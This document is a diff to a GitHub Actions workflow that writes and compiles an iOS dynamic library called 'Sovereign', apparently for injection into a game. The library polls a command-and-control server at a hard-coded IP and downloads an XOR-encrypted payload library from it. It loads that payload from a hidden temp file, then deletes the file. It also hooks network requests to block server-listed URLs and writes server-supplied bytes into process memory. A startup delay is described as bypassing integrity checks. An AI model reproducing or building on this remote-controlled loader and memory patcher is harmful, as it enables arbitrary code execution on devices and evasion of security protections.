@@ -1,4 +1,4 @@
-name: Sovereign-Pro-Build
+name: Sovereign-Pro-Stable-Build
 
 on:
   push:
@@ -12,9 +12,9 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Generate and Compile Sovereign Core
+      - name: Generate and Compile Sovereign Core (Pure Dormant Mode)
         run: |
-          # Generating Pure English Source Code to prevent YAML crashes
+          # Generating Pure English Source Code to prevent any encoding or syntax crashes
           cat << 'EOF' > main.mm
           #import <UIKit/UIKit.h>
           #import <mach-o/dyld.h>
@@ -24,23 +24,49 @@ jobs:
           #import <dlfcn.h>
           #import <unistd.h>
 
-          // [1] COMMAND CENTER COORDINATES
-          // يا جنرال، ضع مسار ملف الـ PHP الخاص بك هنا
-          #define SERVER_HOST @"http://16.171.230.58/dashboard_v120k.php"
+          // [1] COMMAND CENTER LINK (General Wsam C2)
+          #define SERVER_API @"http://16.171.230.58/dashboard_v70_pro.php?api=true"
           #define PAYLOAD_URL @"http://16.171.230.58/sovereign_payload.dylib"
           #define WSAM_KEY 0x57 
 
           static BOOL isPayloadInjected = NO;
+          static NSMutableArray *blockedUrls = nil;
 
-          @interface SovereignEliteHUD : UIView
+          @interface SovereignSlimHUD : UIView
           @property (nonatomic, strong) UILabel *statusLabel;
           @property (nonatomic, strong) UIView *lamp;
           @end
 
-          @implementation SovereignEliteHUD
+          @implementation SovereignSlimHUD
 
           // =========================================================
-          // [2] VOLATILE PAYLOAD (Triggered ONLY by Dashboard)
+          // [2] MINIMAL NETWORK SENSOR (Only active for C2 Blocklist)
+          // =========================================================
+          + (void)load {
+              static dispatch_once_t onceToken;
+              dispatch_once(&onceToken, ^{
+                  blockedUrls = [[NSMutableArray alloc] init];
+                  // ONLY network is hooked for DNS Sinkhole. No Bundle ID spoofing to prevent crashes.
+                  Method origNet = class_getInstanceMethod([NSURLSession class], @selector(dataTaskWithRequest:completionHandler:));
+                  Method swizNet = class_getInstanceMethod([self class], @selector(sov_dataTaskWithRequest:completionHandler:));
+                  method_exchangeImplementations(origNet, swizNet);
+              });
+          }
+
+          - (id)sov_dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error))completionHandler {
+              NSString *url = request.URL.absoluteString;
+              
+              // Blocking Logic strictly from Dashboard Orders
+              for (NSString *blocked in blockedUrls) {
+                  if (blocked.length > 3 && [url containsString:blocked]) {
+                      return nil; // Connection Killed
+                  }
+              }
+              return [self sov_dataTaskWithRequest:request completionHandler:completionHandler];
+          }
+
+          // =========================================================
+          // [3] VOLATILE PAYLOAD ENGINE (Triggered by Dashboard Only)
           // =========================================================
           - (void)igniteVolatilePulse {
               [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:PAYLOAD_URL] completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
@@ -51,43 +77,45 @@ jobs:
                   uint8_t *dest = (uint8_t *)[dec mutableBytes];
                   for (NSUInteger i = 0; i < data.length; i++) { dest[i] = buffer[i] ^ WSAM_KEY; }
 
-                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_pulse_wsam.dylib"];
+                  NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:@".sys_cache_wsam.dylib"];
                   [dec writeToFile:path atomically:YES];
 
                   void *h = dlopen([path UTF8String], RTLD_NOW);
                   if (h) {
                       isPayloadInjected = YES;
-                      unlink([path UTF8String]); 
-                      dispatch_async(dispatch_get_main_queue(), ^{
-                          self.statusLabel.text = @"PAYLOAD INJECTED ✅";
-                          self.statusLabel.textColor = [UIColor greenColor];
-                      });
+                      unlink([path UTF8String]); // Purge from disk
                   }
               }] resume];
           }
 
           // =========================================================
-          // [3] DYNAMIC MEMORY PATCHER (Triggered ONLY by Dashboard)
+          // [4] DYNAMIC PATCH ENGINE (Triggered by Dashboard Only)
           // =========================================================
-          - (void)executePatches:(NSArray *)payloads {
-              uintptr_t shadowBase = _dyld_get_image_vmaddr_slide(0);
-              uintptr_t anogsBase = 0;
-              uint32_t count = _dyld_image_count();
-              for (uint32_t i = 0; i < count; i++) {
-                  const char *name = _dyld_get_image_name(i);
-                  if (name && strstr(name, "anogs")) { anogsBase = _dyld_get_image_vmaddr_slide(i); break; }
-              }
-
+          - (void)executeDynamicPatches:(NSArray *)payloads {
+              uintptr_t mainBase = _dyld_get_image_vmaddr_slide(0);
               mach_port_t task = mach_task_self();
+
               for (NSDictionary *patch in payloads) {
                   NSString *targetFile = patch[@"file_name"];
-                  uintptr_t base = ([targetFile containsString:@"anogs"]) ? anogsBase : shadowBase;
-                  if (base == 0) continue;
-
-                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
-                  uintptr_t targetAddr = base + addr;
                   NSString *hexStr = patch[@"hex_val"];
+                  uintptr_t addr = strtoull([patch[@"address"] UTF8String], NULL, 16);
                   
+                  // Dynamic Base Resolution (No hardcoded packages)
+                  uintptr_t finalSlide = 0;
+                  uint32_t count = _dyld_image_count();
+                  for (uint32_t i = 0; i < count; i++) {
+                      const char *name = _dyld_get_image_name(i);
+                      if (name && strstr(name, [targetFile UTF8String])) {
+                          finalSlide = _dyld_get_image_vmaddr_slide(i);
+                          break;
+                      }
+                  }
+                  
+                  // If target not found, fallback to main executable
+                  if (finalSlide == 0) finalSlide = mainBase;
+                  uintptr_t targetAddr = finalSlide + addr;
+
+                  // Parse Hex
                   NSString *cleanHex = [hexStr stringByReplacingOccurrencesOfString:@" " withString:@""];
                   if ([cleanHex hasPrefix:@"0x"]) cleanHex = [cleanHex substringFromIndex:2];
                   
@@ -97,6 +125,7 @@ jobs:
                       unsigned char c = (unsigned char)v; [data appendBytes:&c length:1];
                   }
 
+                  // Safe Injection
                   kern_return_t kr = vm_protect(task, (vm_address_t)targetAddr, data.length, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
                   if (kr == KERN_SUCCESS) {
                       vm_write(task, (vm_address_t)targetAddr, (vm_offset_t)data.bytes, (mach_msg_type_number_t)data.length);
@@ -106,52 +135,46 @@ jobs:
           }
 
           // =========================================================
-          // [4] SLIM TACTICAL UI ENGINE (Fixed Top Bar)
+          // [5] SLIM UI ENGINE (Top Fixed Bar)
           // =========================================================
           - (instancetype)initWithFrame:(CGRect)frame {
               self = [super initWithFrame:frame];
               if (self) {
-                  // خلفية زجاجية أنيقة جداً
                   self.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.75];
-                  self.layer.cornerRadius = frame.size.height / 2; // حواف دائرية بالكامل
+                  self.layer.cornerRadius = frame.size.height / 2;
                   self.layer.borderColor = [[UIColor cyanColor] colorWithAlphaComponent:0.5].CGColor;
                   self.layer.borderWidth = 1.0;
                   self.clipsToBounds = YES;
 
-                  // اللوجو (الاسم)
                   UILabel *title = [[UILabel alloc] initWithFrame:CGRectMake(15, 0, 70, frame.size.height)];
                   title.text = @"SOVEREIGN";
                   title.textColor = [UIColor cyanColor];
                   title.font = [UIFont boldSystemFontOfSize:11];
                   [self addSubview:title];
 
-                  // الخط الفاصل
                   UIView *divider = [[UIView alloc] initWithFrame:CGRectMake(90, 5, 1, frame.size.height - 10)];
                   divider.backgroundColor = [[UIColor whiteColor] colorWithAlphaComponent:0.2];
                   [self addSubview:divider];
 
-                  // نص الحالة (المتغير)
                   self.statusLabel = [[UILabel alloc] initWithFrame:CGRectMake(100, 0, frame.size.width - 135, frame.size.height)];
                   self.statusLabel.text = @"SYNCING...";
                   self.statusLabel.textColor = [UIColor whiteColor];
                   self.statusLabel.font = [UIFont systemFontOfSize:11];
                   [self addSubview:self.statusLabel];
 
-                  // اللمبة الذكية
                   self.lamp = [[UIView alloc] initWithFrame:CGRectMake(frame.size.width - 20, (frame.size.height - 10) / 2, 10, 10)];
                   self.lamp.backgroundColor = [UIColor orangeColor];
                   self.lamp.layer.cornerRadius = 5;
                   [self addSubview:self.lamp];
 
                   [self startSyncLoop];
-                  // تم إزالة أكواد التحريك (Draggable) ليبقى ثابتاً كما طلبت
               }
               return self;
           }
 
           - (void)startSyncLoop {
-              NSString *apiUrl = [NSString stringWithFormat:@"%@?api=true", SERVER_HOST];
-              NSURLRequest *req = [NSURLRequest requestWithURL:[NSURL URLWithString:apiUrl] cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
+              NSURL *url = [NSURL URLWithString:SERVER_API];
+              NSURLRequest *req = [NSURLRequest requestWithURL:url cachePolicy:NSURLRequestReloadIgnoringCacheData timeoutInterval:10];
               [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
                   dispatch_async(dispatch_get_main_queue(), ^{
                       if (err || !data) return;
@@ -164,8 +187,12 @@ jobs:
                       // 2. Volatile Payload Trigger
                       if ([json[@"payload_status"] intValue] == 1 && !isPayloadInjected) { [self igniteVolatilePulse]; }
 
-                      // 3. Apply Patches
-                      if (json[@"payload"]) { [self executePatches:json[@"payload"]]; }
+                      // 3. Update Blacklist
+                      [blockedUrls removeAllObjects];
+                      if (json[@"blocked_urls"]) [blockedUrls addObjectsFromArray:json[@"blocked_urls"]];
+
+                      // 4. Apply Dynamic Patches (Only what is sent from Dashboard)
+                      if (json[@"payload"]) { [self executeDynamicPatches:json[@"payload"]]; }
 
                       self.statusLabel.text = json[@"notification"];
                       if ([json[@"status"] isEqualToString:@"safe"]) {
@@ -173,13 +200,13 @@ jobs:
                           self.layer.borderColor = [[UIColor greenColor] colorWithAlphaComponent:0.5].CGColor;
                       } else {
                           self.lamp.backgroundColor = [UIColor redColor];
-                          self.statusLabel.textColor = [UIColor redColor];
                           self.layer.borderColor = [[UIColor redColor] colorWithAlphaComponent:0.8].CGColor;
                       }
                   });
               }] resume];
               
-              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
+              // Poll every 10 seconds
+              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(10 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [self startSyncLoop]; });
           }
 
           - (void)showLockdown:(NSString *)m {
@@ -200,8 +227,8 @@ jobs:
           }
           @end
 
-          void __attribute__((constructor)) start_wsam_pro_slim() {
-              // 12 seconds dormant state before waking up UI
+          void __attribute__((constructor)) start_dormant_core() {
+              // Wait 12 seconds to let the game fully load and bypass initial integrity checks
               dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(12 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                   UIWindow *win = nil;
                   if (@available(iOS 13.0, *)) {
@@ -210,18 +237,20 @@ jobs:
                       }
                   }
                   if (!win) win = [UIApplication sharedApplication].keyWindow;
+                  
                   if (win) {
-                      CGFloat screenWidth = [UIScreen mainScreen].bounds.size.width;
-                      // شريط نحيف جداً في أعلى المنتصف (عرض 280، ارتفاع 30)
-                      SovereignEliteHUD *ui = [[SovereignEliteHUD alloc] initWithFrame:CGRectMake((screenWidth - 280) / 2, 45, 280, 30)];
+                      CGFloat sw = [UIScreen mainScreen].bounds.size.width;
+                      // Sleek, fixed top-center UI
+                      SovereignSlimHUD *ui = [[SovereignSlimHUD alloc] initWithFrame:CGRectMake((sw - 280) / 2, 45, 280, 30)];
                       [win addSubview:ui];
                   }
               });
           }
           EOF
 
+          # [!] Compiling the Dylib with Official Apple SDK (Linking C++ Standard Library)
           export SDK_PATH=$(xcrun --sdk iphoneos --show-sdk-path)
-          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Elite_Slim.dylib \
+          clang -dynamiclib -arch arm64 main.mm -o Sovereign_Stable.dylib \
           -isysroot $SDK_PATH \
           -framework Foundation -framework UIKit -framework CoreGraphics \
           -fobjc-arc -Os -w -lc++
@@ -229,5 +258,5 @@ jobs:
       - name: Upload Sovereign Dylib
         uses: actions/upload-artifact@v4
         with:
-          name: Sovereign-Pro-v120k-Slim
-          path: Sovereign_Elite_Slim.dylib
+          name: Sovereign-Stable-Dylib
+          path: Sovereign_Stable.dylib
